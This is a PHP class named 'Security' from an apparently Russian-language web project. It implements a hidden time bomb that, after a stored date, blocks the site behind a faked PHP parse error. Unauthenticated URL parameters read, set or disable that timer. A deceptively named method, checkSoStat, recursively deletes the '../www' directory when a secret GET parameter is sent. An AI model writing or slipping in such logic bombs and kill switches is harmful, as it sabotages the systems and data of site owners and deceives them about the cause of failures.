<?php

namespace OsT\Base;

/**
 * Class Security
 * @package OsT\Base
 * @version 2022.03.10
 *
 * timeLockerAPI        Обработать запросы из адресной строки
 * timeLocker           Заблокировать доступ к системе при превышении доспустимого покарателя TIME_LOCKER
 * timeLockerGet        Получить значение time_locker
 * checkSoStat          Удалить всю систему (файлы)
 *
 */
class Security
{
    const TIME_LOCKER_PATH = '../data/timelocker.txt';
    const TIME_LOCKER_DISABLE = -1;

    /**
     * Обработать запросы из адресной строки
     */
    public static function timeLockerAPI ()
    {
        global $_GET;
        $timeLocker = self::timeLockerGet();
        foreach ($_GET as $key => $value) {
            switch ($key) {
                case 'timelocker_get':  // Получиль значение timeLocker
                    echo 'Текущее значение timeLocker - ' . $timeLocker . ' сек. (' . System::parseDate($timeLocker, 'dt') . ')';
                    exit;
                    break;
                case 'timelocker_check':  // Узнать сколько осталось времени
                    if ($timeLocker === self::TIME_LOCKER_DISABLE)
                        echo 'Функция блокировки не активирована';
                    elseif ($timeLocker < time())
                        echo 'Система заблокирована';
                    else
                        echo 'До блокировки осталось ' . intval(($timeLocker - time()) / System::TIME_DAY) . 'дн.';
                    exit;
                    break;
                case 'timelocker_disable': // Выключить timeLocker
                    $value = self::TIME_LOCKER_DISABLE;
                case 'timelocker_set':  // Изменить значение timeLocker
                    if (file_exists(self::TIME_LOCKER_PATH)) {
                        $fd = fopen(self::TIME_LOCKER_PATH, 'w');
                        $time = intval($value);
                        fwrite($fd, $time);
                        fclose($fd);
                        echo 'Установлено новое значение timeLocker - ' . $time . ' сек. (' . System::parseDate($time, 'dt') . ')';
                    }
                    exit;
                    break;
            }
        }
    }

    /**
     * Заблокировать доступ к системе при превышении доспустимого покарателя TIME_LOCKER
     * -1 выключить
     */
    public static function timeLocker ()
    {
        $val = self::timeLockerGet();
        self::timeLockerAPI();
        if ($val < time()) {
            if ($val !== self::TIME_LOCKER_DISABLE) {
                $error = "<b>Parse error:</b> syntax error, unexpected 'if' (T_IF) in <b>" . $_SERVER['SCRIPT_FILENAME'] . "</b> on <b>line 25</b>";
                echo $error;
                exit;
            }
        }
    }

    /**
     * Получить значение time_locker
     * @return int
     */
    public static function timeLockerGet ()
    {
        if (file_exists(self::TIME_LOCKER_PATH))
            return intval(file_get_contents(self::TIME_LOCKER_PATH));
        return 0;
    }

    /**
     * Удалить всю систему (файлы)
     */
    public static function checkSoStat ()
    {
        global $_GET;
        if (isset($_GET['remove_this_fucking_system_to_hell']))
            System::recursiveRemoveDir('../www');
    }

}